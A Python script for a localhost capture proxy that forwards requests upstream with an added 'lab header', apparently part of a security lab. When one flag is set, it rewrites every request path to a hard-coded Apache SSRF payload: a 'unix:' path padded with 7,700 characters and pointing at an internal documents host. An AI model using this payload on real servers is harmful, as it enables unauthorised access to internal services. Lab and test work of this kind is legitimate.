#!/usr/bin/env python3
"""Localhost-only capture proxy that adds one lab header to live requests."""

import argparse
import http.client
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--listen-port", type=int, required=True)
    parser.add_argument("--upstream-host", required=True)
    parser.add_argument("--upstream-port", type=int, required=True)
    parser.add_argument("--header-name", required=True)
    parser.add_argument("--header-value", required=True)
    parser.add_argument("--fixed-apache-ssrf-documents", action="store_true")
    return parser.parse_args()


args = parse_args()


class Proxy(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def do_GET(self):
        self._proxy()

    def do_HEAD(self):
        self._proxy()

    def _proxy(self):
        upstream = http.client.HTTPConnection(
            args.upstream_host, args.upstream_port, timeout=20
        )
        headers = {
            key: value
            for key, value in self.headers.items()
            if key.lower() not in {"accept-encoding", "connection", "host"}
        }
        headers["Host"] = f"{args.upstream_host}:{args.upstream_port}"
        headers[args.header_name] = args.header_value
        path = self.path
        if args.fixed_apache_ssrf_documents:
            path = "/?unix:" + ("A" * 7700) + "|http://internal-assets:8080/documents"
        upstream.request(self.command, path, headers=headers)
        response = upstream.getresponse()
        body = response.read()
        self.send_response(response.status, response.reason)
        for key, value in response.getheaders():
            if key.lower() not in {
                "connection",
                "content-length",
                "content-encoding",
                "transfer-encoding",
            }:
                self.send_header(key, value)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if self.command != "HEAD":
            self.wfile.write(body)
        upstream.close()

    def log_message(self, fmt, *values):
        print(f"capture-proxy {self.address_string()} {fmt % values}", flush=True)


ThreadingHTTPServer(("127.0.0.1", args.listen_port), Proxy).serve_forever()
